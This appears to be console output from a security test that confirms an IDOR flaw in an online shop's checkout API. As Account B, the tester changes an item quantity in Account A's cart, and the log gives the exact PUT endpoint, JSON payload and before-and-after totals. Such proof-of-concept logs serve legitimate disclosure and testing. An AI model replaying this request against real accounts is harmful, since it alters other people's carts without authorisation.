@@ -1,0 +1,43 @@
+IDOR Write Test - Console Output
+=================================
+
+[*] ========================================
+[*] IDOR WRITE: Modifying Account A's Cart
+[*] ========================================
+
+[+] Cart BEFORE:
+    Items: 5
+    Total: 330.15 EUR
+    Article ID to modify: 2966422
+
+[*] Modifying article 2966422 quantity to 2...
+[+] PUT Response: HTTP 200
+[+] Response: {"togglesAndExperiments":[...]}
+
+[*] Waiting 3 seconds for sync...
+
+[+] Cart AFTER:
+    Items: 5
+    Total: 277.16 EUR
+
+[*] ========================================
+[*] COMPARISON
+[*] ========================================
+    Items: 5 → 5
+    Total: 330.15 EUR → 277.16 EUR
+
+[!!!] ========================================
+[!!!] CRITICAL IDOR WRITE CONFIRMED!
+[!!!] ========================================
+[!!!] Account B successfully modified Account A's cart!
+[!!!] Before: 5 items, 330.15 EUR
+[!!!] After:  5 items, 277.16 EUR
+[!!!] Endpoint: PUT /semiprotected/api/checkout/state-api/v2/set-article-quantity
+[!!!] Payload: {"articleId": 2966422, "quantity": 2}
+
+Key Finding: 
+- Account B (attacker) successfully modified Account A's (victim) cart
+- Total price changed from 330.15 EUR to 277.16 EUR (difference: 52.99 EUR)
+- Modification confirmed via cart-api endpoint after 3-second wait
+- State API also shows changes, confirming the modification persisted
+
